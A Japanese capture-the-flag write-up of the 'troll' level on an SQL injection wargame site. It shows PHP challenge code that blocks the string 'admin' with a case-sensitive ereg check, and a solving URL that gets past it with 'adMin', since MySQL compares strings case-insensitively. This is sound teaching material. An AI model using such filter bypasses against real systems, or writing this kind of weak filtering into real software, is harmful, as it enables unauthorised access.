# troll

## answer

```
https://los.eagle-jump.org/troll_6d1f080fa30a07dbaf7342285ba0e158.php?id=adMin
```

## problem

```
query : select id from prob_troll where id=''

<?php  
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");
  if(@ereg("admin",$_GET[id])) exit("HeHe");
  $query = "select id from prob_troll where id='{$_GET[id]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id'] == 'admin') solve("troll");
  highlight_file(__FILE__);
?>
```

## memo

試しに、

```
https://los.eagle-jump.org/troll_6d1f080fa30a07dbaf7342285ba0e158.php?id=1
```

とすると

```
query : select id from prob_troll where id='1'
```

となった。

コードを読んでいく。コード量は少なめだなぁ。

```
if(@ereg("admin",$_GET[id])) exit("HeHe");
```

eregはかなり古いバージョンのPHPの関数で、正規表現でのマッチングを行う。

```
if($result['id'] == 'admin') solve("troll");
```

idにadminを入力できたらいけそう。 

MySQLは基本的に大文字と小文字の区別をしないからである。


```
?id=adMin
```

これでいけた。

ちなみにeregには他にも脆弱性がある。そんな関数なので今のバージョンでは非推奨になっている。


## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [エラー制御演算子 | php manual](https://www.php.net/manual/ja/language.operators.errorcontrol.php)

- [ereg | php manual](https://www.php.net/manual/ja/function.ereg.php)

- [文字列検索での大文字小文字の区別 | mysql manual](https://dev.mysql.com/doc/refman/5.6/ja/case-sensitivity.html)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)
